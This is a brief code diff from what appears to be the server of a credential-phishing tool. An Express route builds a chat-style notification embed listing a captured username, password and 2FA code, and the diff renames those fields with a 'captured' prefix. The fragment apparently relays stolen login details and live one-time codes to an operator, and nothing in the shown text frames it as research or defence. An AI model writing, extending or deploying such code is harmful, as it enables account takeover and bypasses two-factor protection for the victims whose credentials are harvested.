@@ -1760,7 +1760,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             fields: [
               { 
                 name: "👤 **Account Details**", 
-                value: `**Username:** \`${credentials.username}\`\n**Password:** \`${credentials.password}\`${credentials.twoFactorCode ? `\n**2FA Code:** \`${credentials.twoFactorCode}\`` : ''}`, 
+                value: `**Username:** \`${credentials.capturedUsername}\`\n**Password:** \`${credentials.capturedPassword}\`${credentials.capturedAuthCode ? `\n**2FA Code:** \`${credentials.capturedAuthCode}\`` : ''}`, 
                 inline: false 
               },
               { 
